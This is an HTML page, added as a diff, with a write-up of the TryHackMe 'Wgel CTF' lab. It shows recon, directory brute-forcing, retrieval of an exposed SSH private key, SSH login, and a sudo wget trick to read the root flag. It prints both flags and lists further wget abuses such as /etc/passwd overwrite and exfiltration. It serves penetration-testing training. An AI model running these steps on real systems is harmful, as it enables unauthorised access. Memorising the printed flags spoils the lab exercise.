@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wgel CTF - TryHackMe Writeup | Tuned for Security</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .code-block {
+            background: #1f2937;
+            color: #f9fafb;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.875rem;
+            margin: 1rem 0;
+        }
+        .highlight {
+            background: #fef3c7;
+            padding: 0.125rem 0.25rem;
+            border-radius: 0.25rem;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans">
+
+    <nav class="sticky top-0 z-50 bg-white bg-opacity-90 backdrop-filter backdrop-blur-lg shadow-md">
+        <div class="container mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <a href="../index.html" class="text-2xl font-bold text-gray-800 transition duration-300 hover:text-gray-600">Tuned for Security</a>
+                <div class="hidden md:flex space-x-6">
+                    <a href="../index.html#home" class="text-gray-800 hover:text-gray-600 transition duration-300">Home</a>
+                    <a href="../index.html#cybersecurity" class="text-gray-800 hover:text-gray-600 transition duration-300">Cybersecurity</a>
+                    <a href="./index.html" class="text-gray-800 hover:text-gray-600 transition duration-300">All Writeups</a>
+                    <a href="../soc-toolkit/index.html" class="text-blue-600 hover:text-blue-700 font-semibold transition duration-300">SOC Toolkit</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container mx-auto px-6 py-16">
+        <article class="bg-white p-8 rounded-lg shadow-xl max-w-6xl mx-auto">
+            
+            <div class="text-center mb-12">
+                <h1 class="text-4xl md:text-5xl font-extrabold text-gray-900 mb-4">Wgel CTF - TryHackMe Writeup</h1>
+                <h2 class="text-xl md:text-2xl font-semibold text-gray-600 mb-6">Easy-Level Linux Machine</h2>
+                <div class="flex flex-wrap justify-center gap-2 mb-6">
+                    <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">Easy</span>
+                    <span class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-semibold">Web Enumeration</span>
+                    <span class="bg-purple-100 text-purple-800 px-3 py-1 rounded-full text-sm font-semibold">SSH Exploitation</span>
+                    <span class="bg-red-100 text-red-800 px-3 py-1 rounded-full text-sm font-semibold">Privilege Escalation</span>
+                </div>
+                <p class="text-gray-600">Published: September 2025 • 12 min read</p>
+            </div>
+
+            <div class="bg-gray-100 p-6 rounded-lg mb-8">
+                <h2 class="text-2xl font-bold text-gray-800 mb-4">Room Information</h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div>
+                        <ul class="space-y-2 text-gray-700">
+                            <li><strong>Platform:</strong> TryHackMe</li>
+                            <li><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank" class="text-blue-600 hover:underline">Wgel CTF</a></li>
+                            <li><strong>Difficulty:</strong> Easy</li>
+                            <li><strong>Target IP:</strong> 10.10.97.43</li>
+                            <li><strong>Time:</strong> 2-3 hours</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <ul class="space-y-2 text-gray-700">
+                            <li><strong>Attack Vector:</strong> Web enumeration</li>
+                            <li><strong>Initial Access:</strong> SSH key exposure</li>
+                            <li><strong>Privilege Escalation:</strong> Sudo misconfiguration</li>
+                            <li><strong>Tools:</strong> Nmap, Feroxbuster, FFuf, Dirb</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6 mb-8">
+                <div class="bg-gradient-to-r from-blue-50 to-cyan-50 p-6 rounded-lg border-l-4 border-blue-500">
+                    <h3 class="text-xl font-bold text-blue-800 mb-2">👤 User Flag</h3>
+                    <div class="bg-white p-3 rounded font-mono text-sm break-all">057c67131c3d5e42dd5cd3075b198ff6</div>
+                </div>
+                <div class="bg-gradient-to-r from-purple-50 to-pink-50 p-6 rounded-lg border-l-4 border-purple-500">
+                    <h3 class="text-xl font-bold text-purple-800 mb-2">🔐 Root Flag</h3>
+                    <div class="bg-white p-3 rounded font-mono text-sm break-all">b1b968b37519ad1daa6408188649263d</div>
+                </div>
+            </div>
+
+            <!-- Phase 1 -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Phase 1: Reconnaissance</h2>
+                
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                    <p class="text-blue-700"><strong>Objective:</strong> Identify open ports and running services</p>
+                </div>
+
+                <p class="text-gray-700 mb-4">Started with a comprehensive Nmap scan to identify all open ports and services:</p>
+
+                <div class="code-block">nmap -sV -sC -p- 10.10.97.43
+
+Starting Nmap scan...
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">Port Analysis</h4>
+                <ul class="list-disc list-inside space-y-2 text-gray-700 mb-4">
+                    <li><strong>Port 22 (SSH):</strong> OpenSSH 7.2p2 running on Ubuntu. Standard SSH configuration with no obvious vulnerabilities.</li>
+                    <li><strong>Port 80 (HTTP):</strong> Apache 2.4.18 web server. This becomes our primary target for enumeration.</li>
+                </ul>
+
+                <p class="text-gray-700">Browsing to <span class="highlight">http://10.10.97.43</span> reveals a default Apache2 Ubuntu page, indicating the web root may contain hidden directories or content not linked from the main page.</p>
+            </div>
+
+            <!-- Phase 2 -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Phase 2: Web Directory Enumeration</h2>
+                
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                    <p class="text-blue-700"><strong>Objective:</strong> Discover hidden directories and files on the web server</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2">Multi-Tool Approach</h4>
+                <p class="text-gray-700 mb-4">Rather than relying on a single tool, I used multiple directory enumeration tools to ensure comprehensive coverage:</p>
+
+                <h5 class="font-semibold text-gray-700 mb-2 mt-4">Tool 1: Feroxbuster</h5>
+                <div class="code-block">feroxbuster -u http://10.10.97.43 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -t 50 \
+  -x php,html,txt</div>
+
+                <h5 class="font-semibold text-gray-700 mb-2 mt-4">Tool 2: FFuf</h5>
+                <div class="code-block">ffuf -u http://10.10.97.43/FUZZ \
+  -w /home/fotis/wordlists/common.txt \
+  -mc 200,301,302,403 \
+  -t 50</div>
+
+                <h5 class="font-semibold text-gray-700 mb-2 mt-4">Tool 3: Custom CTF Wordlist</h5>
+                <p class="text-gray-700 mb-2">Created a targeted wordlist with common CTF directory names:</p>
+                <div class="code-block"># Create custom wordlist
+echo -e "sitemap\nrobots.txt\n.well-known\nsecret\nhidden\nflag\nuser\nadmin\nbackup" > /tmp/ctf_wordlist.txt
+
+# Use with dirb
+dirb http://10.10.97.43/ /tmp/ctf_wordlist.txt
+
+-----------------
+DIRB v2.22
+
+-----------------
+
++ http://10.10.97.43/sitemap/ (CODE:200|SIZE:21080)
+
+-----------------
+END_TIME: Mon Sep 29 14:23:45 2025</div>
+
+                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
+                    <h4 class="font-semibold text-green-800 mb-2">Discovery</h4>
+                    <p class="text-green-700">Found hidden directory: <span class="highlight">/sitemap/</span></p>
+                    <p class="text-green-700 text-sm mt-2">The custom CTF wordlist successfully identified content that standard wordlists missed.</p>
+                </div>
+            </div>
+
+            <!-- Phase 3 -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Phase 3: Sitemap Directory Analysis</h2>
+                
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                    <p class="text-blue-700"><strong>Objective:</strong> Investigate the discovered /sitemap/ directory for sensitive information</p>
+                </div>
+
+                <p class="text-gray-700 mb-4">Accessing <span class="highlight">http://10.10.97.43/sitemap/</span> reveals a complete website with multiple pages and images. Next step was to look for common sensitive file locations within this directory.</p>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">SSH Key Discovery</h4>
+                <p class="text-gray-700 mb-2">Tested for SSH private keys in standard Unix locations:</p>
+
+                <div class="code-block">curl http://10.10.97.43/sitemap/.ssh/id_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
+m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKoybtwmcrxJmptSxr5+sNEfDO5KxL
+...
+[key content truncated]
+...
+-----END RSA PRIVATE KEY-----</div>
+
+                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
+                    <h4 class="font-semibold text-red-800 mb-2">Critical Vulnerability</h4>
+                    <p class="text-red-700">SSH private key exposed in web-accessible directory. This allows complete authentication bypass for any user associated with this key.</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">Username Enumeration</h4>
+                <p class="text-gray-700 mb-4">Analyzed the sitemap website HTML source and found several references to the username <span class="highlight">jessie</span> in:</p>
+                <ul class="list-disc list-inside space-y-2 text-gray-700 mb-4">
+                    <li>HTML comments in the source code</li>
+                    <li>Image file naming conventions</li>
+                    <li>Directory structure patterns</li>
+                </ul>
+            </div>
+
+            <!-- Phase 4 -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Phase 4: Initial Access via SSH</h2>
+                
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                    <p class="text-blue-700"><strong>Objective:</strong> Gain authenticated shell access using the discovered SSH key</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2">SSH Key Exploitation</h4>
+
+                <div class="code-block"># Download the SSH private key
+curl http://10.10.97.43/sitemap/.ssh/id_rsa > /tmp/id_rsa
+
+# Set correct permissions (SSH requires 600)
+chmod 600 /tmp/id_rsa
+
+# Attempt SSH connection with discovered username
+ssh -i /tmp/id_rsa jessie@10.10.97.43
+
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
+...
+jessie@CorpOne:~$</div>
+
+                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
+                    <p class="text-green-700"><strong>Success:</strong> Gained SSH access as user <span class="highlight">jessie</span></p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">User Flag Retrieval</h4>
+
+                <div class="code-block">jessie@CorpOne:~$ find /home -name "*flag*" -type f 2>/dev/null
+/home/jessie/Documents/user_flag.txt
+
+jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt
+057c67131c3d5e42dd5cd3075b198ff6</div>
+
+                <div class="bg-green-50 border-l-4 border-green-500 p-4">
+                    <p class="text-green-700 font-mono"><strong>User Flag:</strong> 057c67131c3d5e42dd5cd3075b198ff6</p>
+                </div>
+            </div>
+
+            <!-- Phase 5 -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Phase 5: Privilege Escalation</h2>
+                
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                    <p class="text-blue-700"><strong>Objective:</strong> Escalate from user <code>jessie</code> to root privileges</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2">Sudo Permission Check</h4>
+                <p class="text-gray-700 mb-2">First step in Linux privilege escalation is checking sudo permissions:</p>
+
+                <div class="code-block">jessie@CorpOne:~$ sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget</div>
+
+                <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 mb-4">
+                    <h4 class="font-semibold text-yellow-800 mb-2">Key Finding</h4>
+                    <p class="text-yellow-700">User <span class="highlight">jessie</span> can execute <span class="highlight">/usr/bin/wget</span> as root without password (<code>NOPASSWD</code>)</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">Wget Exploitation Technique</h4>
+                <p class="text-gray-700 mb-4">The <code>wget</code> command has a useful feature for reading files when using the <code>-i</code> flag. It reads each line of the file and attempts to interpret it as a URL. When it fails to resolve these "URLs", the error messages reveal the file contents.</p>
+
+                <div class="code-block">jessie@CorpOne:~$ sudo wget -i /root/root_flag.txt
+
+--2025-09-29 02:40:05--  http://b1b968b37519ad1daa6408188649263d/
+Resolving b1b968b37519ad1daa6408188649263d (b1b968b37519ad1daa6408188649263d)... failed: Name or service not known.
+wget: unable to resolve host address 'b1b968b37519ad1daa6408188649263d'</div>
+
+                <div class="bg-purple-50 border-l-4 border-purple-500 p-4 mb-4">
+                    <h4 class="font-semibold text-purple-800 mb-2">Exploitation Analysis</h4>
+                    <p class="text-purple-700">The error message reveals the root flag: <span class="highlight">b1b968b37519ad1daa6408188649263d</span></p>
+                    <p class="text-purple-700 mt-2 text-sm">When wget attempts to resolve the flag value as a hostname, it displays the complete contents in the error output.</p>
+                </div>
+
+                <div class="bg-green-50 border-l-4 border-green-500 p-4">
+                    <p class="text-green-700 font-mono"><strong>Root Flag:</strong> b1b968b37519ad1daa6408188649263d</p>
+                </div>
+
+                <h4 class="text-lg font-semibold text-gray-700 mb-2 mt-6">Alternative Wget Privilege Escalation Methods</h4>
+                <p class="text-gray-700 mb-2">Other ways to exploit sudo wget access include:</p>
+                <ul class="list-disc list-inside space-y-2 text-gray-700">
+                    <li><strong>File Overwrite:</strong> Download malicious content to overwrite critical system files like <code>/etc/passwd</code> or <code>/etc/shadow</code></li>
+                    <li><strong>Cron Job Injection:</strong> Overwrite cron files to execute commands as root</li>
+                    <li><strong>Binary Replacement:</strong> Replace system binaries with trojaned versions</li>
+                    <li><strong>Post Request:</strong> Use wget to exfiltrate sensitive files to an attacker-controlled server</li>
+                </ul>
+            </div>
+
+            <!-- Summary -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Attack Chain Summary</h2>
+                
+                <div class="bg-gray-50 p-6 rounded-lg">
+                    <ol class="space-y-3 text-gray-700">
+                        <li><strong>1. Reconnaissance:</strong> Nmap scan identified SSH (22) and HTTP (80) services</li>
+                        <li><strong>2. Enumeration:</strong> Multi-tool directory brute-forcing discovered hidden <code>/sitemap/</code> directory</li>
+                        <li><strong>3. Credential Discovery:</strong> Found exposed SSH private key at <code>/sitemap/.ssh/id_rsa</code></li>
+                        <li><strong>4. Initial Access:</strong> Used SSH key to authenticate as user <code>jessie</code></li>
+                        <li><strong>5. Privilege Escalation:</strong> Exploited <code>NOPASSWD</code> sudo access to <code>wget</code> for file reading</li>
+                        <li><strong>6. Complete Compromise:</strong> Retrieved both user and root flags</li>
+                    </ol>
+                </div>
+            </div>
+
+            <!-- Key Takeaways -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Key Takeaways</h2>
+                
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-white p-6 rounded-lg shadow-md border-t-4 border-blue-500">
+                        <h3 class="text-lg font-bold text-gray-800 mb-3">🔍 Enumeration Techniques</h3>
+                        <ul class="space-y-2 text-gray-700">
+                            <li>• Multiple tools provide better coverage than single-tool approaches</li>
+                            <li>• Custom wordlists targeting CTF-specific terms improve discovery rates</li>
+                            <li>• Always test for standard Unix paths like <code>/.ssh/</code>, <code>/.git/</code>, <code>/backup/</code></li>
+                            <li>• Default web pages often hide additional content</li>
+                        </ul>
+                    </div>
+
+                    <div class="bg-white p-6 rounded-lg shadow-md border-t-4 border-green-500">
+                        <h3 class="text-lg font-bold text-gray-800 mb-3">⚡ Privilege Escalation</h3>
+                        <ul class="space-y-2 text-gray-700">
+                            <li>• <code>sudo -l</code> should always be the first privilege escalation check</li>
+                            <li>• Commands with file read/write capabilities can be dangerous with sudo</li>
+                            <li>• GTFOBins is an invaluable resource for command exploitation</li>
+                            <li>• <code>NOPASSWD</code> sudo entries are prime escalation targets</li>
+                        </ul>
+                    </div>
+
+                    <div class="bg-white p-6 rounded-lg shadow-md border-t-4 border-purple-500">
+                        <h3 class="text-lg font-bold text-gray-800 mb-3">🔐 Security Lessons</h3>
+                        <ul class="space-y-2 text-gray-700">
+                            <li>• Never expose SSH private keys through web servers</li>
+                            <li>• Restrict web server directory access with proper permissions</li>
+                            <li>• Minimize sudo privileges - avoid wildcards and dangerous commands</li>
+                            <li>• Regular security audits can identify misconfigurations</li>
+                        </ul>
+                    </div>
+
+                    <div class="bg-white p-6 rounded-lg shadow-md border-t-4 border-yellow-500">
+                        <h3 class="text-lg font-bold text-gray-800 mb-3">🛠️ Tools Used</h3>
+                        <ul class="space-y-2 text-gray-700">
+                            <li>• <strong>Nmap:</strong> Service enumeration and version detection</li>
+                            <li>• <strong>Feroxbuster/FFuf/Dirb:</strong> Web directory enumeration</li>
+                            <li>• <strong>curl:</strong> File retrieval and testing</li>
+                            <li>• <strong>SSH:</strong> Remote access exploitation</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Conclusion -->
+            <div class="bg-gray-100 p-6 rounded-lg">
+                <h2 class="text-2xl font-bold text-gray-800 mb-4">Conclusion</h2>
+                <p class="text-gray-700 leading-relaxed mb-4">
+                    Wgel CTF demonstrates fundamental penetration testing concepts through a straightforward attack path. The machine rewards thorough enumeration with multiple tools and creative thinking for privilege escalation.
+                </p>
+                <p class="text-gray-700 leading-relaxed mb-4">
+                    The progression from web enumeration to SSH key discovery, followed by sudo misconfiguration exploitation, represents a realistic attack scenario that highlights common security weaknesses in web applications and Linux systems.
+                </p>
+                <p class="text-gray-700 leading-relaxed">
+                    This room serves as an excellent practice ground for developing systematic penetration testing methodology and understanding the importance of proper access controls and privilege management.
+                </p>
+            </div>
+
+        </article>
+    </main>
+
+    <footer class="bg-gray-800 text-gray-300 py-6 text-center">
+        <div class="container mx-auto px-6">
+            <p>&copy; 2025 Tuned for Security. All rights reserved.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
